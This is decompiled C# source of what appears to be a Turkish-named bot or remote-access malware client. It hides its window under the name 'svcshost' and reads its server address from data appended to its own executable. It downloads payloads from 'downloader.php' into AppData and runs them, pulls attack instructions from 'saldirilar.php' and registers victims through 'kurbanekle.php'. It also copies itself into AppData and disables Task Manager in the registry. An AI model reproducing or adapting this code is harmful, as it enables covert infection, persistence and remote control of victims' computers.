using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Globalization;
using System.Net;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using ns1;

namespace ns0;

[DesignerGenerated]
internal class Form1 : Form
{
	private static List<WeakReference> list_0 = new List<WeakReference>();

	private IContainer icontainer_0;

	[AccessedThroughProperty("Timer1")]
	private Timer timer_0;

	[AccessedThroughProperty("Timer2")]
	private Timer timer_1;

	private string string_0;

	private string string_1;

	[AccessedThroughProperty("Client")]
	private WebClient webClient_0;

	private string string_2;

	private string string_3;

	private string string_4;

	private string string_5;

	private string string_6;

	private string string_7;

	private string string_8;

	private object object_0;

	private string[] string_9;

	internal virtual Timer Timer1
	{
		[DebuggerNonUserCode]
		get
		{
			return timer_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer1_Tick;
			if (timer_0 != null)
			{
				timer_0.remove_Tick(eventHandler);
			}
			timer_0 = value;
			if (timer_0 != null)
			{
				timer_0.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer2
	{
		[DebuggerNonUserCode]
		get
		{
			return timer_1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer2_Tick;
			if (timer_1 != null)
			{
				timer_1.remove_Tick(eventHandler);
			}
			timer_1 = value;
			if (timer_1 != null)
			{
				timer_1.add_Tick(eventHandler);
			}
		}
	}

	private virtual WebClient Client
	{
		[DebuggerNonUserCode]
		get
		{
			return webClient_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			UploadStringCompletedEventHandler value2 = method_5;
			DownloadStringCompletedEventHandler value3 = method_4;
			if (webClient_0 != null)
			{
				webClient_0.UploadStringCompleted -= value2;
				webClient_0.DownloadStringCompleted -= value3;
			}
			webClient_0 = value;
			if (webClient_0 != null)
			{
				webClient_0.UploadStringCompleted += value2;
				webClient_0.DownloadStringCompleted += value3;
			}
		}
	}

	public Form1()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0019: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		((Form)this).add_FormClosed(new FormClosedEventHandler(Form1_FormClosed));
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_FormClosing));
		((Form)this).add_Load((EventHandler)Form1_Load);
		smethod_0(this);
		string_0 = CultureInfo.CurrentCulture.EnglishName;
		string_1 = checked(string_0.Substring(string_0.IndexOf('(') + 1, string_0.LastIndexOf(')') - string_0.IndexOf('(') - 1));
		Client = new WebClient();
		string_3 = null;
		object_0 = "<!--SON-->";
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	private unsafe static void smethod_0(object object_1)
	{
		void* ptr = stackalloc byte[18];
		lock (list_0)
		{
			((byte*)ptr)[16] = ((list_0.Count == list_0.Capacity) ? ((byte)1) : ((byte)0));
			if (((byte*)ptr)[16] != 0)
			{
				*(int*)ptr = 0;
				byte* num = (byte*)ptr + 4;
				*(int*)((byte*)ptr + 8) = checked(list_0.Count - 1);
				*(int*)num = 0;
				while (true)
				{
					int num2 = *(int*)((byte*)ptr + 4);
					*(int*)((byte*)ptr + 12) = *(int*)((byte*)ptr + 8);
					if (num2 > *(int*)((byte*)ptr + 12))
					{
						break;
					}
					WeakReference weakReference = list_0[*(int*)((byte*)ptr + 4)];
					((byte*)ptr)[16] = (weakReference.IsAlive ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[16] != 0)
					{
						((byte*)ptr)[17] = ((*(int*)((byte*)ptr + 4) != *(int*)ptr) ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[17] != 0)
						{
							list_0[*(int*)ptr] = list_0[*(int*)((byte*)ptr + 4)];
						}
						checked
						{
							(*unchecked((int*)ptr))++;
						}
					}
					checked
					{
						(*unchecked((int*)((byte*)ptr + 4)))++;
					}
				}
				list_0.RemoveRange(*(int*)ptr, checked(list_0.Count - *unchecked((int*)ptr)));
				list_0.Capacity = list_0.Count;
			}
			list_0.Add(new WeakReference(RuntimeHelpers.GetObjectValue(object_1)));
		}
	}

	[DebuggerNonUserCode]
	void Form.Dispose(bool disposing)
	{
		try
		{
			if ((disposing && icontainer_0 != null) ? true : false)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		//IL_00ac: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b6: Expected O, but got Unknown
		icontainer_0 = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		Timer1 = new Timer(icontainer_0);
		Timer2 = new Timer(icontainer_0);
		((Control)this).SuspendLayout();
		Timer1.set_Interval(1000);
		Timer2.set_Interval(900);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		Size clientSize = new Size(0, 0);
		((Form)this).set_ClientSize(clientSize);
		((Form)this).set_ControlBox(false);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)0);
		((Form)this).set_Text("svcshost");
		((Form)this).set_WindowState((FormWindowState)1);
		((Control)this).ResumeLayout(false);
	}

	private unsafe object method_0()
	{
		void* ptr = stackalloc byte[13];
		int try0006_dispatch = -1;
		string text = default(string);
		string[] array = default(string[]);
		string[] array2 = default(string[]);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0006_dispatch)
				{
				default:
					*(int*)((byte*)ptr + 8) = 1;
					Timer1.Stop();
					goto IL_0016;
				case 373:
					{
						*(int*)((byte*)ptr + 4) = *(int*)((byte*)ptr + 8);
						if (*(int*)ptr > -2)
						{
							switch (*(int*)ptr)
							{
							case 1:
								break;
							default:
								goto end_IL_0006;
							}
						}
						int num = *(int*)((byte*)ptr + 4) + 1;
						*(int*)((byte*)ptr + 4) = 0;
						switch (num)
						{
						case 1:
							break;
						case 2:
							goto IL_0016;
						case 3:
							goto IL_001f;
						case 4:
							goto IL_0040;
						case 5:
							goto IL_0054;
						case 6:
							goto IL_006a;
						case 7:
							goto IL_0089;
						case 8:
							goto IL_0099;
						case 10:
						case 11:
							goto IL_00a5;
						case 12:
							goto IL_00e2;
						case 13:
							goto IL_0105;
						case 14:
							goto end_IL_0006_2;
						default:
							goto end_IL_0006;
						case 9:
						case 15:
							goto end_IL_0006_3;
						}
						goto default;
					}
					IL_0105:
					*(int*)((byte*)ptr + 8) = 13;
					text = null;
					break;
					IL_00e2:
					*(int*)((byte*)ptr + 8) = 12;
					Process.Start(Interaction.Environ("appdata") + "\\" + array[1]);
					goto IL_0105;
					IL_0016:
					ProjectData.ClearProjectError();
					*(int*)ptr = -2;
					goto IL_001f;
					IL_001f:
					*(int*)((byte*)ptr + 8) = 3;
					text = Client.DownloadString(string_2 + "\\downloader.php");
					goto IL_0040;
					IL_0040:
					*(int*)((byte*)ptr + 8) = 4;
					array2 = Strings.Split(text, "<!--SON-->", -1, (CompareMethod)0);
					goto IL_0054;
					IL_0054:
					*(int*)((byte*)ptr + 8) = 5;
					array = Strings.Split(array2[0], "|a|", -1, (CompareMethod)0);
					goto IL_006a;
					IL_006a:
					*(int*)((byte*)ptr + 8) = 6;
					((byte*)ptr)[12] = ((Operators.CompareString(array2[0], (string)null, false) == 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[12] != 0)
					{
						goto IL_0089;
					}
					goto IL_00a5;
					IL_0089:
					*(int*)((byte*)ptr + 8) = 7;
					Timer1.Start();
					goto IL_0099;
					IL_0099:
					*(int*)((byte*)ptr + 8) = 8;
					text = null;
					goto end_IL_0006_3;
					IL_00a5:
					*(int*)((byte*)ptr + 8) = 11;
					((ServerComputer)Class1.Computer).get_Network().DownloadFile(array[0], Interaction.Environ("appdata") + "\\" + array[1], "", "", false, 60, true);
					goto IL_00e2;
					end_IL_0006_2:
					break;
				}
				*(int*)((byte*)ptr + 8) = 14;
				Timer1.Start();
				break;
				end_IL_0006:;
			}
			catch (object obj) when ((obj is Exception) & (*(int*)ptr != 0) & (*(int*)((byte*)ptr + 4) == 0))
			{
				ProjectData.SetProjectError((Exception)obj);
				try0006_dispatch = 373;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0006_3:
			break;
		}
		if (*(int*)((byte*)ptr + 4) != 0)
		{
			ProjectData.ClearProjectError();
		}
		object result = default(object);
		return result;
	}

	private unsafe object method_1()
	{
		void* ptr = stackalloc byte[13];
		int try0006_dispatch = -1;
		string text = default(string);
		string text2 = default(string);
		string[] array = default(string[]);
		string[] array2 = default(string[]);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0006_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					*(int*)ptr = -2;
					goto IL_000f;
				case 986:
					{
						*(int*)((byte*)ptr + 4) = *(int*)((byte*)ptr + 8);
						if (*(int*)ptr > -2)
						{
							switch (*(int*)ptr)
							{
							case 1:
								break;
							default:
								goto end_IL_0006;
							}
						}
						int num = *(int*)((byte*)ptr + 4) + 1;
						*(int*)((byte*)ptr + 4) = 0;
						switch (num)
						{
						case 1:
							break;
						case 2:
							goto IL_000f;
						case 3:
							goto IL_001f;
						case 4:
							goto IL_002f;
						case 5:
							goto IL_003b;
						case 6:
							goto IL_005a;
						case 7:
						case 13:
						case 14:
							goto IL_0085;
						case 15:
							goto IL_00a0;
						case 16:
							goto IL_00bf;
						case 17:
							goto IL_00d0;
						case 19:
						case 20:
							goto IL_00e6;
						case 21:
							goto IL_00fc;
						case 23:
							goto IL_011b;
						case 24:
							goto IL_0121;
						case 22:
						case 25:
						case 26:
							goto IL_0130;
						case 27:
							goto IL_0141;
						case 28:
							goto IL_0152;
						case 30:
							goto IL_0171;
						case 31:
							goto IL_0177;
						case 29:
						case 32:
						case 33:
							goto IL_0186;
						case 34:
							goto IL_0197;
						case 35:
							goto IL_01a8;
						case 37:
							goto IL_01c7;
						case 38:
							goto IL_01cd;
						case 36:
						case 39:
						case 40:
							goto IL_01dc;
						case 41:
							goto IL_01ed;
						case 42:
							goto IL_01fe;
						case 44:
							goto IL_021d;
						case 45:
							goto IL_0223;
						case 43:
						case 46:
						case 47:
							goto IL_0232;
						case 48:
							goto IL_0243;
						case 49:
							goto IL_0254;
						case 51:
							goto IL_0273;
						case 52:
							goto IL_0279;
						case 50:
						case 53:
						case 54:
							goto IL_0288;
						case 55:
							goto IL_0299;
						case 8:
							goto IL_02af;
						case 9:
							goto IL_02b4;
						case 10:
							goto IL_02c5;
						case 11:
							goto end_IL_0006_2;
						default:
							goto end_IL_0006;
						case 12:
						case 18:
						case 56:
							goto end_IL_0006_3;
						}
						goto default;
					}
					IL_02c5:
					*(int*)((byte*)ptr + 8) = 10;
					Timer2.Stop();
					break;
					IL_02b4:
					*(int*)((byte*)ptr + 8) = 9;
					Timer1.Start();
					goto IL_02c5;
					IL_000f:
					*(int*)((byte*)ptr + 8) = 2;
					Timer2.Stop();
					goto IL_001f;
					IL_001f:
					*(int*)((byte*)ptr + 8) = 3;
					Timer1.Stop();
					goto IL_002f;
					IL_002f:
					*(int*)((byte*)ptr + 8) = 4;
					text = "/saldirilar.php";
					goto IL_003b;
					IL_003b:
					*(int*)((byte*)ptr + 8) = 5;
					text2 = Client.DownloadString(string_2 + text);
					goto IL_005a;
					IL_005a:
					*(int*)((byte*)ptr + 8) = 6;
					((byte*)ptr)[12] = ((Strings.InStr(1, text2, Conversions.ToString(object_0), (CompareMethod)0) != 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[12] != 0)
					{
						goto IL_0085;
					}
					goto IL_02af;
					IL_0085:
					*(int*)((byte*)ptr + 8) = 14;
					array = Strings.Split(text2, Conversions.ToString(object_0), -1, (CompareMethod)0);
					goto IL_00a0;
					IL_00a0:
					*(int*)((byte*)ptr + 8) = 15;
					((byte*)ptr)[12] = ((Operators.CompareString(array[0], (string)null, false) == 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[12] != 0)
					{
						goto IL_00bf;
					}
					goto IL_00e6;
					IL_00bf:
					*(int*)((byte*)ptr + 8) = 16;
					Timer1.Start();
					goto IL_00d0;
					IL_00d0:
					*(int*)((byte*)ptr + 8) = 17;
					Timer2.Stop();
					goto end_IL_0006_3;
					IL_00e6:
					*(int*)((byte*)ptr + 8) = 20;
					array2 = Strings.Split(array[0], "|a|", -1, (CompareMethod)0);
					goto IL_00fc;
					IL_00fc:
					*(int*)((byte*)ptr + 8) = 21;
					((byte*)ptr)[12] = ((Operators.CompareString(array2[0], (string)null, false) == 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[12] == 0)
					{
						goto IL_011b;
					}
					goto IL_0130;
					IL_011b:
					*(int*)((byte*)ptr + 8) = 23;
					goto IL_0121;
					IL_0121:
					*(int*)((byte*)ptr + 8) = 24;
					string_4 = array2[0];
					goto IL_0130;
					IL_0130:
					*(int*)((byte*)ptr + 8) = 26;
					Timer1.Start();
					goto IL_0141;
					IL_0141:
					*(int*)((byte*)ptr + 8) = 27;
					Timer2.Start();
					goto IL_0152;
					IL_0152:
					*(int*)((byte*)ptr + 8) = 28;
					((byte*)ptr)[12] = ((Operators.CompareString(array2[1], (string)null, false) == 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[12] == 0)
					{
						goto IL_0171;
					}
					goto IL_0186;
					IL_0171:
					*(int*)((byte*)ptr + 8) = 30;
					goto IL_0177;
					IL_0177:
					*(int*)((byte*)ptr + 8) = 31;
					string_5 = array2[1];
					goto IL_0186;
					IL_0186:
					*(int*)((byte*)ptr + 8) = 33;
					Timer1.Start();
					goto IL_0197;
					IL_0197:
					*(int*)((byte*)ptr + 8) = 34;
					Timer2.Start();
					goto IL_01a8;
					IL_01a8:
					*(int*)((byte*)ptr + 8) = 35;
					((byte*)ptr)[12] = ((Operators.CompareString(array2[2], (string)null, false) == 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[12] == 0)
					{
						goto IL_01c7;
					}
					goto IL_01dc;
					IL_01c7:
					*(int*)((byte*)ptr + 8) = 37;
					goto IL_01cd;
					IL_01cd:
					*(int*)((byte*)ptr + 8) = 38;
					string_6 = array2[2];
					goto IL_01dc;
					IL_01dc:
					*(int*)((byte*)ptr + 8) = 40;
					Timer1.Start();
					goto IL_01ed;
					IL_01ed:
					*(int*)((byte*)ptr + 8) = 41;
					Timer2.Start();
					goto IL_01fe;
					IL_01fe:
					*(int*)((byte*)ptr + 8) = 42;
					((byte*)ptr)[12] = ((Operators.CompareString(array2[3], (string)null, false) == 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[12] == 0)
					{
						goto IL_021d;
					}
					goto IL_0232;
					IL_021d:
					*(int*)((byte*)ptr + 8) = 44;
					goto IL_0223;
					IL_0223:
					*(int*)((byte*)ptr + 8) = 45;
					string_7 = array2[3];
					goto IL_0232;
					IL_0232:
					*(int*)((byte*)ptr + 8) = 47;
					Timer1.Start();
					goto IL_0243;
					IL_0243:
					*(int*)((byte*)ptr + 8) = 48;
					Timer2.Start();
					goto IL_0254;
					IL_0254:
					*(int*)((byte*)ptr + 8) = 49;
					((byte*)ptr)[12] = ((Operators.CompareString(array2[4], (string)null, false) == 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[12] == 0)
					{
						goto IL_0273;
					}
					goto IL_0288;
					IL_0273:
					*(int*)((byte*)ptr + 8) = 51;
					goto IL_0279;
					IL_0279:
					*(int*)((byte*)ptr + 8) = 52;
					string_8 = array2[4];
					goto IL_0288;
					IL_0288:
					*(int*)((byte*)ptr + 8) = 54;
					Timer1.Start();
					goto IL_0299;
					IL_0299:
					*(int*)((byte*)ptr + 8) = 55;
					Timer2.Start();
					goto end_IL_0006_3;
					IL_02af:
					*(int*)((byte*)ptr + 8) = 8;
					goto IL_02b4;
					end_IL_0006_2:
					break;
				}
				*(int*)((byte*)ptr + 8) = 11;
				text2 = null;
				break;
				end_IL_0006:;
			}
			catch (object obj) when ((obj is Exception) & (*(int*)ptr != 0) & (*(int*)((byte*)ptr + 4) == 0))
			{
				ProjectData.SetProjectError((Exception)obj);
				try0006_dispatch = 986;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0006_3:
			break;
		}
		if (*(int*)((byte*)ptr + 4) != 0)
		{
			ProjectData.ClearProjectError();
		}
		object result = default(object);
		return result;
	}

	public unsafe string method_2()
	{
		void* ptr = stackalloc byte[12];
		int try0006_dispatch = -1;
		string[] array = default(string[]);
		string text = default(string);
		WebClient webClient = default(WebClient);
		string text2 = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0006_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					*(int*)ptr = -2;
					goto IL_000f;
				case 132:
					{
						*(int*)((byte*)ptr + 4) = *(int*)((byte*)ptr + 8);
						if (*(int*)ptr > -2)
						{
							switch (*(int*)ptr)
							{
							case 1:
								break;
							default:
								goto end_IL_0006;
							}
						}
						int num = *(int*)((byte*)ptr + 4) + 1;
						*(int*)((byte*)ptr + 4) = 0;
						switch (num)
						{
						case 1:
							break;
						case 2:
							goto IL_000f;
						case 3:
							goto IL_001a;
						case 4:
							goto IL_0037;
						case 5:
							goto end_IL_0006_2;
						default:
							goto end_IL_0006;
						case 6:
							goto end_IL_0006_3;
						}
						goto default;
					}
					IL_0037:
					*(int*)((byte*)ptr + 8) = 4;
					array = Strings.Split(text, "<!--SON-->", -1, (CompareMethod)0);
					break;
					IL_001a:
					*(int*)((byte*)ptr + 8) = 3;
					text = webClient.DownloadString(string_2 + "/ip.php");
					goto IL_0037;
					IL_000f:
					*(int*)((byte*)ptr + 8) = 2;
					webClient = new WebClient();
					goto IL_001a;
					end_IL_0006_2:
					break;
				}
				*(int*)((byte*)ptr + 8) = 5;
				text2 = array[0];
				break;
				end_IL_0006:;
			}
			catch (object obj) when ((obj is Exception) & (*(int*)ptr != 0) & (*(int*)((byte*)ptr + 4) == 0))
			{
				ProjectData.SetProjectError((Exception)obj);
				try0006_dispatch = 132;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0006_3:
			break;
		}
		string result = text2;
		if (*(int*)((byte*)ptr + 4) != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	private unsafe void Form1_FormClosed(object sender, FormClosedEventArgs e)
	{
		void* ptr = stackalloc byte[12];
		int try0006_dispatch = -1;
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0006_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					*(int*)ptr = -2;
					break;
				case 140:
					{
						*(int*)((byte*)ptr + 4) = *(int*)((byte*)ptr + 8);
						if (*(int*)ptr > -2)
						{
							switch (*(int*)ptr)
							{
							case 1:
								break;
							default:
								goto end_IL_0006;
							}
						}
						int num = *(int*)((byte*)ptr + 4) + 1;
						*(int*)((byte*)ptr + 4) = 0;
						switch (num)
						{
						case 1:
							break;
						case 2:
							goto end_IL_0006_2;
						default:
							goto end_IL_0006;
						case 3:
							goto end_IL_0006_3;
						}
						goto default;
					}
					end_IL_0006_2:
					break;
				}
				*(int*)((byte*)ptr + 8) = 2;
				NewLateBinding.LateCall((object)Client, (Type)null, "UploadString", new object[2]
				{
					Operators.ConcatenateObject((object)(string_2 + "/kurbanekle.php?pc="), method_3(string_3 + "&durum=Offline|s|")),
					""
				}, (string[])null, (Type[])null, (bool[])null, true);
				break;
				end_IL_0006:;
			}
			catch (object obj) when ((obj is Exception) & (*(int*)ptr != 0) & (*(int*)((byte*)ptr + 4) == 0))
			{
				ProjectData.SetProjectError((Exception)obj);
				try0006_dispatch = 140;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0006_3:
			break;
		}
		if (*(int*)((byte*)ptr + 4) != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private unsafe void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		void* ptr = stackalloc byte[12];
		int try0006_dispatch = -1;
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0006_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					*(int*)ptr = -2;
					break;
				case 140:
					{
						*(int*)((byte*)ptr + 4) = *(int*)((byte*)ptr + 8);
						if (*(int*)ptr > -2)
						{
							switch (*(int*)ptr)
							{
							case 1:
								break;
							default:
								goto end_IL_0006;
							}
						}
						int num = *(int*)((byte*)ptr + 4) + 1;
						*(int*)((byte*)ptr + 4) = 0;
						switch (num)
						{
						case 1:
							break;
						case 2:
							goto end_IL_0006_2;
						default:
							goto end_IL_0006;
						case 3:
							goto end_IL_0006_3;
						}
						goto default;
					}
					end_IL_0006_2:
					break;
				}
				*(int*)((byte*)ptr + 8) = 2;
				NewLateBinding.LateCall((object)Client, (Type)null, "UploadString", new object[2]
				{
					Operators.ConcatenateObject((object)(string_2 + "/kurbanekle.php?pc="), method_3(string_3 + "&durum=Offline|s|")),
					""
				}, (string[])null, (Type[])null, (bool[])null, true);
				break;
				end_IL_0006:;
			}
			catch (object obj) when ((obj is Exception) & (*(int*)ptr != 0) & (*(int*)((byte*)ptr + 4) == 0))
			{
				ProjectData.SetProjectError((Exception)obj);
				try0006_dispatch = 140;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0006_3:
			break;
		}
		if (*(int*)((byte*)ptr + 4) != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private object method_3(string string_10)
	{
		string_10 = Strings.Replace(string_10, "ç", "c", 1, -1, (CompareMethod)0);
		string_10 = Strings.Replace(string_10, "Ç", "C", 1, -1, (CompareMethod)0);
		string_10 = Strings.Replace(string_10, "İ", "I", 1, -1, (CompareMethod)0);
		string_10 = Strings.Replace(string_10, "ı", "i", 1, -1, (CompareMethod)0);
		string_10 = Strings.Replace(string_10, "ğ", "g", 1, -1, (CompareMethod)0);
		string_10 = Strings.Replace(string_10, "Ğ", "G", 1, -1, (CompareMethod)0);
		string_10 = Strings.Replace(string_10, "ş", "s", 1, -1, (CompareMethod)0);
		string_10 = Strings.Replace(string_10, "Ş", "S", 1, -1, (CompareMethod)0);
		return string_10;
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private unsafe void Form1_Load(object sender, EventArgs e)
	{
		//IL_0395: Unknown result type (might be due to invalid IL or missing references)
		//IL_03db: Unknown result type (might be due to invalid IL or missing references)
		//IL_0421: Unknown result type (might be due to invalid IL or missing references)
		//IL_0464: Unknown result type (might be due to invalid IL or missing references)
		//IL_0484: Unknown result type (might be due to invalid IL or missing references)
		void* ptr = stackalloc byte[14];
		int try0006_dispatch = -1;
		string text = default(string);
		string text2 = default(string);
		string text3 = default(string);
		string text4 = default(string);
		RegistryKey registryKey = default(RegistryKey);
		string text5 = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0006_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					*(int*)ptr = -2;
					goto IL_000f;
				case 1836:
					{
						*(int*)((byte*)ptr + 4) = *(int*)((byte*)ptr + 8);
						if (*(int*)ptr > -2)
						{
							switch (*(int*)ptr)
							{
							case 1:
								break;
							default:
								goto end_IL_0006;
							}
						}
						int num = *(int*)((byte*)ptr + 4) + 1;
						*(int*)((byte*)ptr + 4) = 0;
						switch (num)
						{
						case 1:
							break;
						case 2:
							goto IL_000f;
						case 3:
							goto IL_001b;
						case 4:
							goto IL_0026;
						case 5:
							goto IL_003b;
						case 6:
							goto IL_004d;
						case 7:
							goto IL_0064;
						case 8:
							goto IL_007d;
						case 9:
							goto IL_0095;
						case 10:
							goto IL_00a9;
						case 11:
							goto IL_00e1;
						case 13:
						case 14:
							goto IL_0118;
						case 15:
							goto IL_0137;
						case 16:
							goto IL_014e;
						case 17:
							goto IL_0166;
						case 18:
						case 19:
							goto IL_0173;
						case 20:
							goto IL_0195;
						case 21:
							goto IL_01b9;
						case 22:
							goto IL_01d8;
						case 23:
						case 24:
							goto IL_01f8;
						case 25:
							goto IL_021a;
						case 26:
							goto IL_0258;
						case 27:
							goto IL_0261;
						case 30:
							goto IL_02a3;
						case 31:
							goto IL_02a9;
						case 32:
							goto IL_02c8;
						case 33:
						case 34:
							goto IL_02d9;
						case 35:
							goto IL_02f8;
						case 28:
						case 29:
						case 36:
						case 37:
						case 38:
							goto IL_0327;
						case 39:
							goto IL_0349;
						case 41:
						case 42:
							goto IL_035a;
						case 43:
							goto IL_037c;
						case 45:
							goto IL_03a0;
						case 46:
							goto IL_03c2;
						case 48:
							goto IL_03e6;
						case 49:
							goto IL_0408;
						case 51:
							goto IL_0429;
						case 52:
							goto IL_044b;
						case 54:
						case 55:
							goto IL_046c;
						case 12:
						case 40:
						case 44:
						case 47:
						case 50:
						case 53:
						case 56:
						case 57:
						case 58:
						case 60:
							goto IL_048a;
						case 61:
							goto IL_0493;
						case 62:
							goto IL_04d6;
						case 63:
							goto IL_04f2;
						case 64:
							goto IL_04ff;
						case 65:
							goto IL_0558;
						case 66:
							goto end_IL_0006_2;
						default:
							goto end_IL_0006;
						case 59:
						case 67:
							goto end_IL_0006_3;
						}
						goto default;
					}
					IL_0558:
					*(int*)((byte*)ptr + 8) = 65;
					NewLateBinding.LateCall((object)Client, (Type)null, "UploadString", new object[2]
					{
						Operators.ConcatenateObject((object)(string_2 + "/kurbanekle.php?pc="), method_3(text + "|a|" + text2 + "|a|" + string_1 + "|a|" + text3 + "|a|&durum=Online|s|")),
						""
					}, (string[])null, (Type[])null, (bool[])null, true);
					break;
					IL_04ff:
					*(int*)((byte*)ptr + 8) = 64;
					string_3 = text + "|a|" + text2 + "|a|" + string_1 + "|a|" + text3 + "|a|";
					goto IL_0558;
					IL_000f:
					*(int*)((byte*)ptr + 8) = 2;
					((Form)this).set_ShowInTaskbar(false);
					goto IL_001b;
					IL_001b:
					*(int*)((byte*)ptr + 8) = 3;
					((Control)this).Hide();
					goto IL_0026;
					IL_0026:
					*(int*)((byte*)ptr + 8) = 4;
					FileSystem.FileOpen(1, Application.get_ExecutablePath(), (OpenMode)32, (OpenAccess)1, (OpenShare)3, -1);
					goto IL_003b;
					IL_003b:
					*(int*)((byte*)ptr + 8) = 5;
					text4 = Strings.Space(checked((int)FileSystem.LOF(1)));
					goto IL_004d;
					IL_004d:
					*(int*)((byte*)ptr + 8) = 6;
					FileSystem.FileGet(1, ref text4, -1L, false);
					goto IL_0064;
					IL_0064:
					*(int*)((byte*)ptr + 8) = 7;
					FileSystem.FileClose(new int[1] { 1 });
					goto IL_007d;
					IL_007d:
					*(int*)((byte*)ptr + 8) = 8;
					string_9 = Strings.Split(text4, "<-hakops->", -1, (CompareMethod)0);
					goto IL_0095;
					IL_0095:
					*(int*)((byte*)ptr + 8) = 9;
					string_2 = string_9[1];
					goto IL_00a9;
					IL_00a9:
					*(int*)((byte*)ptr + 8) = 10;
					Timer1.set_Interval(checked((int)Math.Round(Conversion.Val((object)(Conversions.ToDouble(string_9[2]) * 1000.0)))));
					goto IL_00e1;
					IL_00e1:
					*(int*)((byte*)ptr + 8) = 11;
					((byte*)ptr)[12] = ((Operators.CompareString(Application.get_ExecutablePath(), Interaction.Environ("appdata") + "\\svcshost.exe", false) == 0) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[12] == 0)
					{
						goto IL_0118;
					}
					goto IL_048a;
					IL_0118:
					*(int*)((byte*)ptr + 8) = 14;
					((byte*)ptr)[12] = (Conversions.ToBoolean(string_9[3]) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[12] != 0)
					{
						goto IL_0137;
					}
					goto IL_0173;
					IL_0137:
					*(int*)((byte*)ptr + 8) = 15;
					registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
					goto IL_014e;
					IL_014e:
					*(int*)((byte*)ptr + 8) = 16;
					registryKey.SetValue("DisableTaskMgr", 1);
					goto IL_0166;
					IL_0166:
					*(int*)((byte*)ptr + 8) = 17;
					registryKey.Close();
					goto IL_0173;
					IL_0173:
					*(int*)((byte*)ptr + 8) = 19;
					((byte*)ptr)[12] = (Conversions.ToBoolean(string_9[5]) ? ((byte)1) : ((byte)0));
					if (((byte*)ptr)[12] != 0)
					{
						goto IL_0195;
					}
					goto IL_02a3;
					IL_0195:
					*(int*)((byte*)ptr + 8) = 20;
					FileSystem.FileCopy(Application.get_ExecutablePath(), Interaction.Environ("appdata") + "\\svcshost.exe");
					goto IL_01b9;
					IL_01b9:
					*(int*)((byte*)ptr + 8) = 21;
